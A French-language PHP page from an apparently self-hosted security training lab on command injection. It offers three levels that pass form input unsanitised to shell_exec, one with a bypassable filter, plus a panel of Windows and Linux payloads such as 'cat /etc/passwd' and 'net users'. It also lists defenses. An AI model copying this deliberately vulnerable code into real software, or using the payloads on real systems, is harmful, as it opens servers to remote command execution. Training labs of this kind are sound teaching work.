<?php
require_once __DIR__ . '/../../config/config.php';

$level = $_GET['level'] ?? '1';
$output = '';
$cmd_run = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' || isset($_GET['host'])) {
    if ($level == '1') {
        // ⚠️ NIVEAU 1 : Injection directe sans filtre
        $host = $_POST['host'] ?? $_GET['host'] ?? '';
        $cmd_run = "ping -n 1 $host";  // Windows
        $output = shell_exec($cmd_run . " 2>&1");

    } elseif ($level == '2') {
        // ⚠️ NIVEAU 2 : Filtre basique bypassable
        $host = $_POST['host'] ?? '';
        // Filtre faible - cherche seulement ';' et '|'
        if (strpos($host, ';') !== false || strpos($host, '|') !== false) {
            $output = "⛔ Caractères interdits détectés !";
        } else {
            $cmd_run = "ping -n 1 $host";
            $output = shell_exec($cmd_run . " 2>&1");
            // Bypass: utiliser & ou && ou backticks ou $() au lieu de ; et |
        }

    } elseif ($level == '3') {
        // ⚠️ NIVEAU 3 : Injection dans un contexte différent
        $filename = $_POST['filename'] ?? '';
        // Simule une commande de vérification de fichier
        $cmd_run = "dir $filename";
        $output = shell_exec($cmd_run . " 2>&1");
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Injection Lab — CyberLab</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/KaliTest/assets/css/style.css">
</head>
<body>
    <canvas id="matrix-canvas"></canvas>

    <nav class="navbar">
        <div class="nav-brand">
            <div class="brand-icon">⬡</div>
            <span class="brand-name">CYBER<span class="accent">LAB</span></span>
        </div>
        <div class="nav-status" style="margin-right:auto">
            <div class="status-dot"></div>
            <span class="status-text" id="nav-time"></span>
        </div>
        <div class="nav-links">
            <a href="/KaliTest/" class="nav-link">Accueil</a>
            <a href="/KaliTest/labs/" class="nav-link">Labs</a>
        </div>
    </nav>

    <div class="page-wrapper">
        <div class="page-header">
            <p class="page-breadcrumb"><a href="/KaliTest/">Accueil</a> / <a href="/KaliTest/labs/">Labs</a> / Command Injection</p>
            <h1 class="page-title">💻 COMMAND INJECTION LAB</h1>
            <p class="page-desc">Injectez des commandes système dans des champs d'entrée pour exécuter des commandes arbitraires sur le serveur.</p>
        </div>

        <div style="display:flex; gap:.6rem; margin-bottom:2rem; flex-wrap:wrap">
            <a href="?level=1" class="lab-btn" style="<?= $level=='1'?'background:rgba(0,255,136,.2); border-color:var(--neon-green)':'' ?>">Niveau 1 — Sans filtre</a>
            <a href="?level=2" class="lab-btn" style="<?= $level=='2'?'background:rgba(0,255,136,.2); border-color:var(--neon-green)':'' ?>">Niveau 2 — Filtre faible</a>
            <a href="?level=3" class="lab-btn" style="<?= $level=='3'?'background:rgba(0,255,136,.2); border-color:var(--neon-green)':'' ?>">Niveau 3 — Contexte fichier</a>
        </div>

        <div class="lab-content">
            <div>
                <div class="lab-panel" style="margin-bottom:1.5rem">
                    <div class="panel-header">
                        🎯 NIVEAU <?= $level ?> —
                        <?= $level=='1' ? 'Outil Ping (Aucun filtre)' : ($level=='2' ? 'Ping avec filtre basique' : 'Vérificateur de fichier') ?>
                    </div>
                    <div class="panel-body">
                        <?php if ($level == '1'): ?>
                        <p style="font-size:.85rem; color:var(--neon-red); margin-bottom:1rem">
                            ⚠️ L'IP est directement passée dans <code>shell_exec("ping -n 1 $host")</code> sans aucun filtrage.
                        </p>
                        <form method="POST" action="?level=1">
                            <div class="form-group">
                                <label class="form-label">ADRESSE IP / HÔTE À PINGER</label>
                                <input type="text" name="host" class="form-input"
                                       placeholder="ex: 127.0.0.1"
                                       value="<?= htmlspecialchars($_POST['host'] ?? '127.0.0.1') ?>">
                                <p class="form-hint">💡 Injectez des commandes après l'IP: 127.0.0.1 & whoami</p>
                            </div>
                            <button type="submit" class="btn-submit">🌐 PING</button>
                        </form>

                        <?php elseif ($level == '2'): ?>
                        <p style="font-size:.85rem; color:var(--neon-yellow); margin-bottom:1rem">
                            🔍 Filtre ';' et '|' seulement. Bypass avec <code>&amp;&amp;</code>, <code>&amp;</code>, ou <code>`commande`</code>.
                        </p>
                        <form method="POST" action="?level=2">
                            <div class="form-group">
                                <label class="form-label">HÔTE À PINGER</label>
                                <input type="text" name="host" class="form-input"
                                       placeholder="127.0.0.1"
                                       value="<?= htmlspecialchars($_POST['host'] ?? '127.0.0.1') ?>">
                                <p class="form-hint">💡 Bypass: 127.0.0.1 && whoami (utiliser &amp;&amp; au lieu de ;)</p>
                            </div>
                            <button type="submit" class="btn-submit">🌐 PING</button>
                        </form>

                        <?php elseif ($level == '3'): ?>
                        <p style="font-size:.85rem; color:var(--neon-blue); margin-bottom:1rem">
                            🔍 Un outil vérifie l'existence d'un fichier via <code>dir [nom]</code>. Injectez des commandes.
                        </p>
                        <form method="POST" action="?level=3">
                            <div class="form-group">
                                <label class="form-label">NOM DU FICHIER À VÉRIFIER</label>
                                <input type="text" name="filename" class="form-input"
                                       placeholder="ex: C:\Windows\System32"
                                       value="<?= htmlspecialchars($_POST['filename'] ?? 'C:\\Windows\\System32') ?>">
                                <p class="form-hint">💡 Testez: C:\Windows & whoami & ipconfig</p>
                            </div>
                            <button type="submit" class="btn-submit">🔍 VÉRIFIER</button>
                        </form>
                        <?php endif; ?>

                        <?php if ($cmd_run): ?>
                        <div style="margin-top:1rem; padding:.5rem .8rem; background:rgba(0,0,0,.3); border:1px solid rgba(255,215,0,.1); border-radius:4px">
                            <span style="font-family:var(--font-mono); font-size:.7rem; color:var(--neon-yellow)">// Commande exécutée: </span>
                            <code style="font-family:var(--font-mono); font-size:.75rem; color:var(--neon-red)"><?= htmlspecialchars($cmd_run) ?></code>
                        </div>
                        <?php endif; ?>

                        <?php if ($output !== ''): ?>
                        <div class="result-box" style="margin-top:1rem">
                            <div class="result-header">💻 SORTIE DE LA COMMANDE</div>
                            <div class="result-body">
                                <pre style="font-family:var(--font-mono); font-size:.8rem; color:var(--neon-green); white-space:pre-wrap; word-break:break-all"><?= htmlspecialchars($output) ?></pre>
                            </div>
                        </div>
                        <?php endif; ?>
                    </div>
                </div>

                <!-- Operateurs d'injection -->
                <div class="lab-panel">
                    <div class="panel-header">📚 OPÉRATEURS D'INJECTION (Windows/Linux)</div>
                    <div class="panel-body">
                        <table class="data-table">
                            <tr><th>Opérateur</th><th>Comportement</th><th>Windows</th><th>Linux</th></tr>
                            <tr><td><code style="color:var(--neon-green)">&amp;</code></td><td>Exécute les deux commandes</td><td>✅</td><td>✅</td></tr>
                            <tr><td><code style="color:var(--neon-green)">&amp;&amp;</code></td><td>2ème si 1ère réussit</td><td>✅</td><td>✅</td></tr>
                            <tr><td><code style="color:var(--neon-green)">|</code></td><td>Pipe la sortie</td><td>✅</td><td>✅</td></tr>
                            <tr><td><code style="color:var(--neon-green)">||</code></td><td>2ème si 1ère échoue</td><td>✅</td><td>✅</td></tr>
                            <tr><td><code style="color:var(--neon-green)">;  </code></td><td>Séparateur de commandes</td><td>❌</td><td>✅</td></tr>
                            <tr><td><code style="color:var(--neon-green)">`cmd`</code></td><td>Substitution de commande</td><td>❌</td><td>✅</td></tr>
                            <tr><td><code style="color:var(--neon-green)">$(cmd)</code></td><td>Substitution de commande</td><td>❌</td><td>✅</td></tr>
                        </table>
                    </div>
                </div>
            </div>

            <div class="hint-panel">
                <div class="hint-section">
                    <div class="panel-header">📖 GUIDE CMDi</div>
                </div>
                <div class="hint-section">
                    <p class="hint-title">⚡ PAYLOADS WINDOWS</p>
                    <code class="hint-code">127.0.0.1 & whoami</code>
                    <code class="hint-code">127.0.0.1 && ipconfig /all</code>
                    <code class="hint-code">127.0.0.1 | net users</code>
                    <code class="hint-code">127.0.0.1 & type C:\Windows\System32\drivers\etc\hosts</code>
                    <code class="hint-code">127.0.0.1 & dir C:\</code>
                </div>
                <div class="hint-section">
                    <p class="hint-title">⚡ PAYLOADS LINUX</p>
                    <code class="hint-code">127.0.0.1; id</code>
                    <code class="hint-code">127.0.0.1; cat /etc/passwd</code>
                    <code class="hint-code">127.0.0.1 && uname -a</code>
                    <code class="hint-code">$(id)</code>
                    <code class="hint-code">`whoami`</code>
                </div>
                <div class="hint-section">
                    <p class="hint-title">🛡️ DÉFENSES</p>
                    <p class="hint-text">
                        • escapeshellarg() / escapeshellcmd()<br>
                        • Éviter shell_exec(), exec(), system()<br>
                        • Whitelisting des entrées<br>
                        • Principe du moindre privilège<br>
                        • Désactiver les fonctions dangereuses
                    </p>
                </div>
            </div>
        </div>
    </div>

    <script src="/KaliTest/assets/js/main.js"></script>
    <script>
        document.querySelectorAll('.hint-code').forEach(code => {
            code.addEventListener('click', () => {
                const input = document.querySelector('.form-input');
                if (input) {
                    input.value = code.textContent.trim();
                    showToast('Payload copié dans le champ !');
                }
            });
        });
    </script>
</body>
</html>
